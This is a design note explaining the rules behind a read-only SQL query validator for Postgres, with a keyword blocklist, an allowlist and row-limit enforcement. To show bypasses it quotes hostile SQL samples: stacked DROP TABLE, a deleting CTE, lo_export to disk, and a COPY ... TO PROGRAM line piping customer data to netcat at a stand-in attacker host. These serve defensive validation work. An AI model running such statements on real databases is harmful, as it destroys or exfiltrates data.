# Query validation rules

This is the reasoning behind `scripts/validate_query.py`. Read it before
changing the validator or before deciding you can skip it — a query
validator is easy to make *look* correct and hard to make actually correct,
because SQL has more entry points to a side effect than a first glance
suggests.

## Why this can't just be `query.strip().upper().startswith("SELECT")`

That check passes all of the following, none of which are safe to run
read-only:

```sql
SELECT 1; DROP TABLE users;
```
Two statements. Most Postgres drivers (including `psql` and libpq's
`PQexec`) will happily execute both if given the string as-is. The first
`SELECT` satisfies a prefix check while the second statement does the
damage. **Rule: reject anything that is not exactly one statement.**
Splitting on unquoted, non-comment semicolons is enough to catch this —
you do not need a full parser, but you do need to be quote- and
comment-aware so a semicolon inside a string literal doesn't cause a false
split.

```sql
WITH deleted AS (
  DELETE FROM sessions WHERE expired = true RETURNING *
)
SELECT count(*) FROM deleted;
```
Starts with `WITH`, ends with `SELECT` — and deletes every expired session
as a side effect. **Rule: scan the entire statement body for write
keywords, not just the leading clause.** A writable CTE can appear at any
depth, including nested inside another CTE.

```sql
SELECT lo_export(loid, '/tmp/dump.bin') FROM large_objects;
COPY (SELECT * FROM customers) TO PROGRAM 'nc attacker.example 4444';
```
The first is a syntactically valid `SELECT` that writes a file to the
database host's disk. The second is technically a `COPY`, which a naive
"reject DDL/DML" list might not think to include, and `TO PROGRAM` pipes
the output to an arbitrary shell command on the server. **Rule: blocklist
specific dangerous functions and constructs by name (`pg_read_file`,
`pg_read_binary_file`, `lo_import`, `lo_export`, `COPY ... TO/FROM
PROGRAM`), not just statement-type keywords.**

```sql
dRoP TaBlE  users;
DROP/*inline comment*/TABLE users;
```
Case variation and inline comments can slip past a naive, case-sensitive,
comment-unaware substring match. **Rule: normalize case and strip SQL
comments (`--` line comments and `/* */` block comments) before running any
keyword match.**

## The keyword blocklist

Reject the statement if, after stripping comments and normalizing case, it
contains any of these as a standalone SQL keyword (word-boundary match, not
a raw substring match — you don't want to reject a column literally named
`created_at` because it contains `create`):

```
INSERT, UPDATE, DELETE, MERGE, DROP, ALTER, TRUNCATE, GRANT, REVOKE,
CREATE, COPY, CALL, DO, VACUUM, EXECUTE, REINDEX, CLUSTER, REFRESH,
LISTEN, NOTIFY, SECURITY LABEL
```

And these specific functions, wherever they appear (even inside a `SELECT`
target list):

```
pg_read_file, pg_read_binary_file, pg_ls_dir, pg_ls_logdir, pg_ls_waldir,
lo_import, lo_export, dblink_exec, pg_terminate_backend, pg_cancel_backend
```

## The allowlist (what a statement must start with)

After the reject checks pass, additionally require the statement to begin
with one of: `SELECT`, `WITH`, `EXPLAIN`, `TABLE`, `VALUES`. This is a
second, independent check — don't treat "didn't match the blocklist" as
equivalent to "matched the allowlist." New Postgres syntax (or a construct
you didn't anticipate) should fail closed by not matching the allowlist,
rather than fail open by not matching the blocklist.

## Row limit enforcement

- If the statement has no top-level `LIMIT`, append one at the configured
  default (`DEFAULT_ROW_LIMIT`).
- If it has a `LIMIT` above the configured ceiling (`MAX_ROW_LIMIT`), replace
  it with the ceiling rather than rejecting the query outright — the intent
  ("give me a bounded number of rows") is still honored, just capped.
- Do this by appending/rewriting the outermost `LIMIT`, not by truncating
  the result client-side after the full query already ran. A cap that's
  enforced after the data is fetched doesn't protect the database from the
  cost of producing that data.

## What this validator deliberately does not try to do

- **It is not a query cost estimator.** A query can pass every rule above
  and still be expensive (full scan on a huge, unindexed table with a
  selective `WHERE`). That's what `statement_timeout` is for — see the main
  `SKILL.md` pitfalls section. Don't extend this validator into a
  half-built cost model; use `EXPLAIN` and the database's own timeout
  instead.
- **It is not a substitute for database-level permissions.** If the
  connecting role can write, a bug in this validator (or a sufficiently
  creative bypass nobody has thought of yet) is the only thing standing
  between a request and a write. Keep the read-only role as the actual
  control; treat this file as the second, not the first, line of defense.
